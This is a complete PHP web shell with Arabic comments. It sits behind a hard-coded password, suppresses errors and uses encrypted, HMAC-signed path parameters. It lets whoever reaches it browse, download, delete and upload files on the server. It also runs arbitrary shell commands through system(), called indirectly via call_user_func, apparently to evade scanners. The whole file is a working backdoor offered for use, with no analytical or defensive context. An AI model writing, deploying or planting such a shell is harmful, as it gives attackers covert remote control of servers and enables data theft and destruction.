<?php
session_start();error_reporting(0);

// 🔑 إعدادات مختصرة
$k='k_'.sha1(__FILE__); // مفتاح ديناميكي
$p=password_hash('106',PASSWORD_BCRYPT); // كلمة مرور

// 🧠 دوال مضغوطة
$f=function($d,$k){$i=openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));return base64_encode(openssl_encrypt($d,'aes-256-cbc',$k,0,$i).'::'.$i);};
$g=function($d,$k){$x=explode('::',base64_decode($d),2);return openssl_decrypt($x[0],'aes-256-cbc',$k,0,$x[1]??'');};
$s=function($a,$k){ksort($a);$q=http_build_query($a);$a['h']=hash_hmac('sha256',$q,$k);return'?'.http_build_query($a);};
$v=function($a,$k){if(!isset($a['h']))return 0;$h=$a['h'];unset($a['h']);ksort($a);return hash_equals($h,hash_hmac('sha256',http_build_query($a),$k));};

// 🔐 دخول
if(!isset($_SESSION['ok'])){
    if(isset($_POST['pw'])&&password_verify($_POST['pw'],$p)){$_SESSION['ok']=1;} 
    else {echo"<html><body style='background:#111;color:#0f0;text-align:center'><form method='post'><input type='password' name='pw' placeholder='🔑'><button>OK</button></form></body></html>";exit;}
}

// تحقق من HMAC
if($_GET&&!$v($_GET,$k)){http_response_code(403);exit;}

// 🗂 المسار الحالي
$c=isset($_GET['x'])?$g($_GET['x'],$k):getcwd();
$c=realpath($c)?:getcwd();

// تنفيذ أوامر عبر call_user_func
$exec="system";$run=function($cmd)use($exec){call_user_func($exec,$cmd);};

// حذف
if(isset($_GET['r'])){$d=$g($_GET['r'],$k);if(is_file($d))unlink($d);header("Location:".$s(['x'=>$f(dirname($d),$k)],$k));exit;}

// تحميل
if(isset($_GET['d'])){$d=$g($_GET['d'],$k);if(is_file($d)){header('Content-Disposition: attachment; filename="'.basename($d).'"');readfile($d);exit;}}

// رفع
if(isset($_FILES['f']))move_uploaded_file($_FILES['f']['tmp_name'],$c.'/'.$_FILES['f']['name']);

// واجهة
echo"<html><head><meta charset='utf-8'><style>body{background:#000;color:#0f0;font-family:monospace}a{color:#0ff;text-decoration:none}</style></head><body>";
echo"<h3>📂 ".htmlspecialchars($c)."</h3><table>";
foreach(scandir($c)as$f1){if($f1==".")continue;$p1="$c/$f1";$e=$f($p1,$k);
echo"<tr><td>".(is_dir($p1)?"<a href='".$s(['x'=>$e],$k)."'>".htmlspecialchars($f1)."/</a>":htmlspecialchars($f1))."</td><td>";
if(!is_dir($p1))echo"<a href='".$s(['d'=>$e],$k)."'>📥</a> <a href='".$s(['r'=>$e],$k)."' onclick='return confirm(\"Del?\")'>🗑</a>";
echo"</td></tr>";}
echo"</table><form method='post' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='⏫'></form>";
echo"<form method='post'><input name='c'><button>▶</button></form>";
if(isset($_POST['c'])){echo"<pre>";$run($_POST['c']);echo"</pre>";}
echo"</body></html>";
